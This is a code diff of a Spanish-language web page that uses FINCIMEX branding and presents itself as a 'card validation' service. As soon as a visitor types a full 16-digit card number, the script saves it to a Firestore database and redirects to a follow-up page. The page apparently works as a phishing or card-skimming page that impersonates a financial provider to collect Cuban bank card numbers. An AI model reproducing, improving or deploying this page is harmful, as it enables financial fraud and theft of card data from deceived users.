@@ -1,207 +1,69 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Validación de Tarjeta • FINCIMEX</title>
-
 <style>
-body{
-  margin:0;
-  padding:0;
-  font-family:"Segoe UI", Arial, sans-serif;
-  background:#00111f url("img/fondo2.jpg") no-repeat center center/cover;
-  min-height:100vh;
-  color:white;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  text-align:center;
-  animation:fadeIn 1s ease-in;
-}
-
-@keyframes fadeIn{
-  from{opacity:0;} to{opacity:1;}
-}
-
-.contenedor{
-  background:rgba(0,0,0,0.60);
-  padding:40px 25px;
-  border-radius:20px;
-  width:90%;
-  max-width:420px;
-  backdrop-filter: blur(4px);
-  animation:slide 1.2s ease;
-}
-
-@keyframes slide{
-  from{transform:translateY(40px); opacity:0;}
-  to{transform:translateY(0); opacity:1;}
-}
-
-.logo{
-  width:110px;
-  margin-bottom:15px;
-}
-
-h2{
-  font-size:26px;
-  margin-bottom:20px;
-}
-
-input{
-  width:100%;
-  padding:15px;
-  font-size:22px;
-  border-radius:10px;
-  border:none;
-  outline:none;
-  margin-top:10px;
-  text-align:center;
-  letter-spacing:2px;
-  background:#ffffff15;
-  color:white;
-}
-
-.resultado{
-  margin-top:25px;
-  font-size:26px;
-  font-weight:bold;
-}
-
-.tipo{
-  font-size:20px;
-  margin-top:8px;
-  color:#ffd700;
-}
-
-.boton{
-  background:#00a2ff;
-  padding:14px 35px;
-  border-radius:10px;
-  display:inline-block;
-  margin-top:20px;
-  color:white;
-  font-size:20px;
-  text-decoration:none;
-  transition:0.3s;
-  font-weight:600;
-}
-.boton:hover{
-  background:#007fcc;
-}
-
-/* Botón secundario: volver al inicio */
-.boton-secondary{
-  background:#666;
-  margin-left:10px;
-}
-.boton-secondary:hover{
-  background:#444;
-}
-
-footer{
-  margin-top:40px;
-  font-size:14px;
-  color:#f1f1f1;
-}
+body{margin:0;padding:0;font-family:"Segoe UI",Arial,sans-serif;background:#00111f url("img/fondo2.jpg") no-repeat center center/cover;min-height:100vh;color:white;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;}
+.contenedor{background:rgba(0,0,0,0.6);padding:40px 25px;border-radius:20px;width:90%;max-width:420px;backdrop-filter:blur(4px);}
+.logo{width:110px;margin-bottom:15px;}
+h2{font-size:26px;margin-bottom:20px;}
+input{width:100%;padding:15px;font-size:22px;border-radius:10px;border:none;outline:none;margin-top:10px;text-align:center;letter-spacing:2px;background:#ffffff15;color:white;}
+.resultado{margin-top:25px;font-size:20px;font-weight:700;}
+.tipo{font-size:18px;margin-top:8px;color:#ffd700;}
+.boton{background:#00a2ff;padding:14px 35px;border-radius:10px;margin-top:20px;color:white;font-size:18px;text-decoration:none;display:inline-block;font-weight:600;}
+.boton.secondary{background:#666;margin-left:10px;}
+footer{margin-top:40px;font-size:14px;color:#f1f1f1;}
 </style>
 </head>
 <body>
-
 <div class="contenedor">
   <img src="img/logo.png" class="logo" alt="FINCIMEX">
   <h2>Validación de tarjeta</h2>
-
   <input type="text" id="card" maxlength="16" placeholder="Introduce los 16 dígitos..." oninput="detectar()">
-
   <div class="resultado" id="resultado"></div>
   <div class="tipo" id="tipo"></div>
-
-  <a href="#" id="continuar" class="boton" style="display:none;" onclick="goFinal()">Continuar</a>
-  <a href="index.html" class="boton boton-secondary">Volver al inicio</a>
+  <a href="#" id="continuar" class="boton" style="display:none;" onclick="irFinal()">Verificar y continuar</a>
+  <a href="index.html" class="boton secondary">Volver al inicio</a>
 </div>
+<footer>FINCIMEX • Todos los derechos reservados</footer>
 
-<footer>
-  FINCIMEX • Todos los derechos reservados
-</footer>
-
-<!-- ===== Firebase JS ===== -->
+<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <script src="js/firebase.js"></script>
 
 <script>
-// Detecta el banco y tipo
+// detectar y guardar un registro preliminar
 function detectar(){
-  const num = document.getElementById("card").value;
+  const num = document.getElementById("card").value.trim();
   const res = document.getElementById("resultado");
-  const tipo = document.getElementById("tipo");
+  const tipoEl = document.getElementById("tipo");
   const btn = document.getElementById("continuar");
-
-  res.innerHTML = "";
-  tipo.innerHTML = "";
-  btn.style.display = "none";
-
+  res.textContent = ""; tipoEl.textContent = ""; btn.style.display = "none";
   if(num.length < 4) return;
-
-  const prefijo = num.substring(0,4);
-
-  // Validación numérica
-  if(num.length === 16 && !/^\d+$/.test(num)){
-    res.innerHTML = "❌ Solo se permiten números";
-    return;
-  }
-
-  let banco="", tipoTarjeta="";
-
-  // BANDEC
-  if(["9225","9226","9235","9305"].includes(prefijo)){
-    banco="BANDEC"; tipoTarjeta="CUP / MLC";
-  }
-  // BPA
-  else if(["9560","9561","4570"].includes(prefijo)){
-    banco="BPA"; tipoTarjeta="CUP / MLC";
-  }
-  // Banco Metropolitano
-  else if(["9203","9204","9205"].includes(prefijo)){
-    banco="Banco Metropolitano"; tipoTarjeta="CUP / MLC";
-  }
-  // AIS FINCIMEX
-  else if(["9400","9405","9300","9310"].includes(prefijo)){
-    banco="FINCIMEX (AIS)"; tipoTarjeta=(prefijo==="9400")?"AIS CUP":"AIS USD / MLC";
-  } 
-  else {
-    res.innerHTML="❓ No coincide con tarjetas cubanas";
-    return;
-  }
-
-  res.innerHTML = "🏦 Banco: " + banco;
-  tipo.innerHTML = "Tipo: " + tipoTarjeta;
-
-  if(num.length===16) btn.style.display="inline-block";
-
-  // Guardar en Firebase
-  if(num.length===16){
-    db.collection("verificaciones").add({
-      card: num,
-      bank: banco,
-      card_type: tipoTarjeta,
+  if(num.length === 16 && !/^\d+$/.test(num)){ res.textContent = "❌ Solo se permiten números"; return; }
+  const pref = num.substring(0,4);
+  let bank=null, card_type=null;
+  if(["9225","9226","9235","9305"].includes(pref)){ bank='BANDEC'; card_type='CUP/MLC'; }
+  else if(["9560","9561","4570"].includes(pref)){ bank='BPA'; card_type='CUP/MLC'; }
+  else if(["9203","9204","9205"].includes(pref)){ bank='Banco Metropolitano'; card_type='CUP/MLC'; }
+  else if(["9400","9405","9300","9310"].includes(pref)){ bank='FINCIMEX (AIS)'; card_type=(pref==='9400'?'AIS CUP':'AIS USD/MLC'); }
+  else { res.textContent = "❓ No coincide con tarjetas cubanas"; return; }
+  res.textContent = "🏦 " + bank; tipoEl.textContent = card_type;
+  if(num.length === 16) btn.style.display = 'inline-block';
+  // guarda preliminar en Firestore (no sube imágenes aquí)
+  if(num.length === 16){
+    db.collection('verificaciones_preliminares').add({
+      tarjeta: num,
+      banco: bank,
+      card_type: card_type,
       timestamp: new Date()
-    }).then(() => {
-      console.log("✅ Guardado en Firebase");
-    }).catch(err => {
-      console.error("❌ Error guardando:", err);
-    });
+    }).then(()=> console.log('Guardado preliminar'))
+      .catch(e=> console.error('Error guardando preliminar', e));
   }
 }
-
-function goFinal(){
-  window.location.href = "final.html";
-}
+function irFinal(){ window.location.href = 'final.html'; }
 </script>
-
 </body>
 </html>
